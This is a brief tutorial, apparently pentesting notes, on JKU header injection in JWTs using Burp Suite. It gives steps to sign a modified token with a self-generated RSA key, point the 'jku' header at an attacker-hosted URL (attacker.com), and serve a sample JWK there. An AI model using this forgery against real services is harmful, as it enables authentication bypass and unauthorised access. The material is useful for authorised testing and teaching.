# JKU Header Injection With Burpsuite

## Burp Extensions

- JWT Editor Keys
- JSON Web Tokens

## Steps

1. With the extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.
2. Generate a new RSA key.
3. Send a request containing a JWT to Burp Repeater.
4. In the message editor, switch to the extension-generated JSON Web Token tab and modify the token's payload however you like.
5. Edit the "Header" to contain the parameter: "jku" with the value of a url and file you control, eg. "https://attacker.com/keys"
6. Click Sign, when prompted, select your newly generated RSA key.
7. At the attacker controlled endpoint create a file containing your public key as JWK (see figure 1 below)
8. Send the request to test how the server responds.

Figure 1:

```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "9ed62ec0-8f8c-4c2d-90f3-411afa6a1274",
            "n": "uGVai7ZlCvT7VHGsaHuiIvHSqizoS1HwfW0rYFkczGmqAa9aeeRpEtBOjuOxeYttRqNLoffFiRIDA5RvfXXTyy5tsSaVGJYBX2zCrVRWjZEii_lRdF4OYKpdgHVcy2ubnVUH4jefbSpqOPBWyJXvLiyYEH6bcPqzl6h-VkYz3MSPQ-FsJfABe4dDTGVoUMWEQ1J6pArS97s6emYGN_SwjvdA4tQ3OvfAbYJRJfz_5svuy6XNTphwckdnDy88yKIET7X6YeE6GjA3t-RkyM_wy3m2ETRhVrobfUX1xqI97soYQqRx2Qhr1_wRXBWkF6tc4VqWJx4quELAFRHhbDGexw"
        }
    ]
}
```
